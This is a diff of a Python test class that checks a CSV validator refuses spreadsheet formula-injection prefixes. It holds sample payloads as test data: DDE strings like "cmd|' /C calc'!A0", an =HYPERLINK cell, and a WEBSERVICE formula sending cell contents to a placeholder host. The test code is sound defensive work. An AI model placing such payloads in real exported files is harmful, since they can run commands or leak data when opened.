@@ -1549,14 +1549,15 @@ class TestMigrateBugsSection(MigrateBase):
 
 
 class TestCsvFormulaPrefix(CsvBase):
-    DASH = "- outside a bullet or a --flag"
+    DASH = "-, which"  # any leading -, whatever follows it
     BAD = {"=1+1": "=", "+1": "+", "@SUM(A1)": "@", "\tnote": "a TAB", "\rnote": "a CR", "-1": DASH, "-x(": DASH,
            "  =trimmed": "=", "--1+cmd|' /C calc'!A0": DASH, "- 1+cmd|' /C calc'!A0": DASH, "-- cmd|' /C calc'!A0": DASH,
            "-1 HP": DASH, "- 1 item": DASH, "-": DASH, "--": DASH, "--Dry-run": DASH, "--dry-run|calc": DASH, "  -1 HP": DASH,
-           "- a+cmd|' /C calc'!A0": "- and holds a |", "--flag|x": DASH, "--dry-run x|y": "- and holds a |",
-           "  - a|b": "- and holds a |"}
-    GOOD = ("- item", "--by main GD", "plain text", "a = b", "e-mail @ desk", "- fix the hook budget",
-            "--with-ledger used by round-cap", "--dry-run", "use a|b pipe in the middle")
+           "- a+cmd|' /C calc'!A0": DASH, "--flag|x": DASH, "--dry-run x|y": DASH, "  - a|b": DASH,
+           "- fix the hook budget": DASH, "--dry-run": DASH, "--with-ledger used by round-cap": DASH, "- item": DASH,
+           '- WEBSERVICE("https://host/?"&A2)': DASH, "--dry-run WEBSERVICE(x)": DASH}
+    GOOD = ("plain text", "a = b", "e-mail @ desk", "use a|b pipe in the middle", "fix the hook budget - later",
+            "Run --dry-run first")
 
     def test_each_prefix_is_refused_on_add_and_update(self):
         self.register()
@@ -1595,15 +1596,15 @@ class TestCsvFormulaPrefix(CsvBase):
         body = (b'id,agent,lane,changed,verified,attempts,limitations\n'
                 b'L-001,QA,serial,"=HYPERLINK(""x"")",ok,1/1,\n'
                 b'L-002,QA,,-2+3,,,\n'
-                b'L-003,QA,,- item,--by,,\n'
+                b'L-003,QA,,item list,by main GD,,\n'
                 b"L-004,QA,,-- cmd|' /C calc'!A0,,,\n")
         p.write_bytes(b"\xef\xbb\xbf" + body)
         code, out, err = self.run_cli("csv", "doctor", "log", "--feature", "shop")
         self.assertEqual(code, 1)
         self.assertIn("line 2: changed: starts with =", err)
-        self.assertIn("line 3: changed: starts with - outside a bullet", err)
+        self.assertIn("line 3: changed: starts with -, which", err)
         self.assertNotIn("line 4", err)
-        self.assertIn("line 5: changed: starts with - outside a bullet", err)
+        self.assertIn("line 5: changed: starts with -, which", err)
         self.assertNotIn("HYPERLINK", err)
         self.assertNotIn("calc", err)
         code, out, err = self.run_cli("csv", "doctor", "log", "--feature", "shop", "--fix")
